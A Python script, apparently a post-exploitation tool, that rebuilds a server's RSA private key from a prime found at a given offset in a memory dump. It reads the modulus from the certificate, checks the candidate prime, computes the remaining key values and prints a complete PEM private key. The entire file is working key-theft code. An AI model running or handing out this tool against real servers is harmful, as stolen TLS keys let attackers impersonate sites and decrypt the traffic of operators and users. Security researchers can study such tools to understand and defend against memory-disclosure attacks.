#!/usr/bin/env python3
"""  
Restore SSL priv key based on prime at specific dump file offset.  
Author: Einar Otto Stangvik / @einaros / https://hacking.ventures
Environment: Python 3
"""  
from __future__ import print_function
import sys, struct, subprocess, binascii, re, base64
import gmpy 
from pyasn1.codec.der import encoder
from pyasn1.type.univ import *

def get_modulus(cert_path):
  return subprocess.Popen(
    ['openssl', 'x509', '-noout', '-in', cert_path, '-modulus'], 
    stdout = subprocess.PIPE, 
    stderr = subprocess.PIPE
    ).communicate()[0].split(b'=')[1]

def long(data, offset, size):
  n = 0
  for i in range(size):
    n |= data[offset+i] << (8*i)
  return n

def hexdump(data, offset, size):
  for b in range(offset, offset + size, 16):
    lin = [c for c in data[b : b + 16]]
    hxdat = ' '.join('%02X' % c for c in lin)
    pdat = ''.join((chr(c) if 32 <= c <= 126 else '.' )for c in lin)
    print('  %04x: %-48s %s' % (b, hxdat, pdat))
  print()
    
def main(cert_path, data_path, offset):
  mod = get_modulus(cert_path)
  mod = int(mod, 16)
  key_size = int(mod.bit_length() / 16)
  offset = int(offset, 16)
  print('Prime should be at offset: %x'%offset)
  print('Key size: %d\n'%key_size)
  with open(data_path, 'rb') as f:
    data = f.read()
  print('Hexdump of surrounding data:')
  hexdump(data, max(0, offset - 1024), 2048)
  p = long(data, offset, key_size)
  if gmpy.is_prime(p) and p != mod and mod % p == 0:
    print('Prime factor found: %s\n'%p)
    hexbytes = binascii.hexlify(data[offset:offset+key_size]).decode('ascii').upper()
    hexbytes = re.sub(r'(..)', r'\x\1', hexbytes)
    print('Prime in greppable ascii: %s\n'%hexbytes)
    p = gmpy.mpz(p)
    e = gmpy.mpz(65537)
    q = gmpy.divexact(mod,p)
    phi = (p-1) * (q-1)
    d = gmpy.invert(e, phi)
    dp = d % (p - 1)
    dq = d % (q - 1)
    qinv = gmpy.invert(q, p)
    seq = Sequence()
    for x in [0, mod, e, d, p, q, dp, dq, qinv]:
      seq.setComponentByPosition (len (seq), Integer (x))
    print("\n\n-----BEGIN RSA PRIVATE KEY-----\n%s-----END RSA PRIVATE KEY-----\n\n"%base64.encodestring(encoder.encode(seq)).decode('ascii'))
  else:
    print('Prime factor not found')
    
if __name__ == '__main__':
  sys.exit(main(*sys.argv[1:]))
